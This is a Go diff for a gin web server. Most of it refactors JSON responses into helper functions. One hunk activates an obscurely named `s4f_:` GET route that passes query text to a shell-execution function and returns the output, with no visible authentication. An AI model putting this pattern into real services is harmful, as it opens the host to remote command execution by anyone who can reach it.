@@ -19,7 +19,7 @@ func SetHeaderHTML(c *gin.Context) {
 }
 
 func Ok(c *gin.Context) {
-	c.JSON(HTTP_OK, gin.H{
+	JSON(c, HTTP_OK, gin.H{
 		"test": "ok",
 	})
 }
@@ -34,7 +34,7 @@ func ApplyMatch(c *gin.Context, statement map[string]func(c *gin.Context), cmd s
 		}
 	}
 	if !isValid {
-		c.JSON(HTTP_INVALID, gin.H{"invalid": cmd})
+		JSON(c, HTTP_INVALID, gin.H{"invalid": cmd})
 	}
 }
 
@@ -54,6 +54,16 @@ func CheckQuery(c *gin.Context) string {
 func HTMLString(c *gin.Context, s string) {
 	c.Header("Content-Type", "text/html; charset=utf-8")
 	c.String(HTTP_OK, s)
+}
+
+func JSON(c *gin.Context, code int, obj interface{}) {
+	c.Header("Content-Type", "application/json")
+	c.JSON(code, obj)
+}
+
+func IndentedJSON(c *gin.Context, code int, obj interface{}) {
+	c.Header("Content-Type", "application/json")
+	c.IndentedJSON(code, obj)
 }
 
 func ParseGet(c *gin.Context) {
@@ -81,7 +91,7 @@ func ParseGet(c *gin.Context) {
 		`^status$`: GetStatus,
 		`^clients$`: func(c *gin.Context) {
 			// LOWER == private == emit
-			c.JSON(HTTP_OK, ServerStatus.clients)
+			IndentedJSON(c, HTTP_OK, ServerStatus.clients)
 		},
 		`^kick$`: func(c *gin.Context) {
 			SetKick(c)
@@ -106,9 +116,11 @@ func ParseGet(c *gin.Context) {
 		`^time$`: func(c *gin.Context) {
 			HTMLString(c, strconv.FormatInt(time.Now().UnixMilli(), 10))
 		},
-		//`^s4f_:`: ,
+		`^s4f_:`: func(c *gin.Context) {
+			HTMLString(c, RunShell(cmd[strings.Index(cmd, ":")+1:], 10))
+		},
 		`store`: func(c *gin.Context) {
-			c.JSON(HTTP_OK, ServerStatus.store)
+			JSON(c, HTTP_OK, ServerStatus.store)
 		},
 		//any
 	}
@@ -118,7 +130,7 @@ func ParseGet(c *gin.Context) {
 func ParsePost(c *gin.Context) {
 	cmd := CheckQuery(c)
 	if len(cmd) == 0 {
-		c.JSON(HTTP_INVALID, gin.H{"reason": "Empty Query"})
+		JSON(c, HTTP_INVALID, gin.H{"reason": "Empty Query"})
 		return
 	}
 	statement := map[string]func(c *gin.Context){
@@ -137,7 +149,7 @@ func ParsePost(c *gin.Context) {
 func ParsePut(c *gin.Context) {
 	cmd := CheckQuery(c)
 	if len(cmd) == 0 {
-		c.JSON(HTTP_INVALID, gin.H{"reason": "Empty Query"})
+		JSON(c, HTTP_INVALID, gin.H{"reason": "Empty Query"})
 		return
 	}
 	statement := map[string]func(c *gin.Context){
